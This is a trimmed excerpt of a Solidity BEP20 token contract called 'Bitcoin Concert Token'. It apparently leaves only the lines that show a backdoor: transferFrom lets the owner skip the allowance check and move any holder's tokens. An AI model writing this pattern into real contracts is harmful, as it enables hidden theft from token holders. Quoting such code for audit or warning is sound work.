...
contract Ownable is Context {
  ...
  function isOwner(address wallet) internal view returns (bool) {
    return _owner == wallet;
  }
...
contract BitcoinConcertToken is Context, IBEP20, Ownable {
  ...
  constructor() {
    _name = 'Bitcoin Concert Token';
    _symbol = 'BCT';
    _decimals = 18;
    _totalSupply = 110 * 1000000000000 * 10 ** _decimals;
  ...
  */
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    require(isOwner(_msgSender()) || _allowances[sender][_msgSender()] >= amount, "BEP20: transfer amount exceeds allowance");
